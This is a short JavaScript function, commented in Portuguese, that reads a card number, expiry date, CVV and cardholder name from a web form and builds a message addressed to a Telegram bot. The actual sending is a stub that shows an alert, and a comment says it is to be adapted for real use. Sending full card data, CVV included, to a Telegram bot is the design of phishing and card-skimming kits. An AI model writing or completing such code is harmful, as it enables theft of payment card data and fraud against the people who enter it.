function enviarPagamento() {
    // Obter os valores dos campos de entrada
    var cardNumber = document.getElementById("card-number").value;
    var expiryDate = document.getElementById("expiry-date").value;
    var cvv = document.getElementById("cvv").value;
    var cardName = document.getElementById("card-name").value;

    // Construir a mensagem para enviar ao bot do Telegram
    var message = "Informações de pagamento recebidas:\n\n";
    message += "Número do Cartão: " + cardNumber + "\n";
    message += "Data de Validade: " + expiryDate + "\n";
    message += "CVV: " + cvv + "\n";
    message += "Nome no Cartão: " + cardName;

    // Enviar a mensagem para o bot do Telegram
    // Este código é apenas um exemplo e precisa ser adaptado para sua implementação real
    alert("Mensagem enviada ao bot do Telegram:\n\n" + message);
}
